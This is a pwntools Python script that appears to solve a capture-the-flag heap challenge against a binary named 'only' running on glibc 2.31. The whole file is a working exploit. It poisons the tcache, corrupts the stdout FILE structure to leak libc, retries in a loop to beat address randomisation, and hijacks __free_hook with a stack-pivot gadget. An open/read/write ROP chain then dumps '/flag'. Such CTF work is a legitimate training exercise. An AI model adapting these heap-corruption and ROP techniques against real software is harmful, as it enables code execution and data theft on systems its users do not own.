from pwn import *

context(log_level='DEBUG', arch='amd64', os='linux')
context.terminal = "wt.exe -w main nt bash -c".split()

sh = process(['./only'])
elf = ELF('./only')
libc = ELF('/home/nova/glibc-all-in-one/libs/2.31-0ubuntu9_amd64/libc.so.6')

def initial(size: int = 0, init: bool = False):
    sh.sendlineafter(b"Choice >> ", b'0')
    if init:
        sh.sendlineafter(b"Size:", str(size).encode())


def increase(size: int, content: bytes):
    sh.sendlineafter(b"Choice >> ", b'1')
    sh.sendlineafter(b"Size:", str(size).encode())
    sh.sendafter(b"Content:", content)


def decrease():
    sh.sendlineafter(b"Choice >> ", b'2')


def debug():
    gdb.attach(sh, 'b *$rebase(0x1718)\nb *$rebase(0x1794)\nb *$rebase(0x1773)')
    pause()


while True:
    sh = process(['./only'])
    increase(0xe0, b'\n')
    decrease()
    initial(init=False)
    decrease()

    increase(0xe0, b'\xf0\xb7\n')
    increase(0xe0, b'\xf0\xb7\n')
    try:
        increase(0xe0, p64(0) + p64(0x491) + b'\x00\xb8\n')
        increase(0x60, b'\n')
        decrease()
        increase(0x30, b'\xa0\x16\n')
        increase(0x60, b'\n')
        increase(0x60, p64(0xfbad3887) + p64(0)*3 + p8(8) + b'\n')
    except EOFError:
        sh.close()
        continue

    libc_base = u64(sh.recv(6).ljust(8, b'\x00')) - 0x1eb980
    if not hex(libc_base).startswith("0x7f"):
        sh.close()
        continue
    free_hook = libc_base + libc.sym['__free_hook']
    system = libc_base + libc.sym['system']
    pop_rdi_ret = libc_base + 0x26b72
    pop_rsi_ret = libc_base + 0x27529
    pop_rdx_pop_r12_ret = libc_base + 0x11c1e1
    pop_rbp_ret = libc_base + 0x256c0
    mov_rsp_rdx_ret = libc_base + 0x5e650
    open = libc_base + libc.sym['open']
    read = libc_base + libc.sym['read']
    write = libc_base + libc.sym['write']
    setcontext = libc_base + libc.sym['setcontext']
    gets = libc_base + libc.sym['gets']
    gadget = libc_base + 0x1547a0  # mov rdx, [rdi+8]; mov rsp, rdx; call [rdx+0x20]
    bss = libc_base + 0x1ED648
    increase(0xe0, p64(0) * 5 + p64(0x81) + p64(free_hook) + b'\n')

    increase(0x70, p64(0) + b'\n')
    print("libc_base >>>", hex(libc_base))
    #                                   rdi+8             [rdi+8] = rdx                                                 rdx+0x20
    #                                                          rsp              rbp            rbp+8       
    increase(0x70, p64(gadget) + p64(free_hook + 0x10) + p64(pop_rbp_ret) + p64(free_hook) + p64(gets) + p64(0) + p64(mov_rsp_rdx_ret) + p64(0) + b'\n')
    decrease()
    payload = b'a'*0x28
    payload += p64(pop_rdi_ret) + p64(free_hook + 0xa8) + p64(pop_rsi_ret) + p64(0) + p64(open)
    payload += p64(pop_rdi_ret) + p64(3) + p64(pop_rsi_ret) + p64(bss) + p64(pop_rdx_pop_r12_ret) + p64(0x30)*2 + p64(read)
    payload += p64(pop_rdi_ret) + p64(1) + p64(write) + b'/flag\x00'
    sh.sendline(payload)
    sh.interactive()
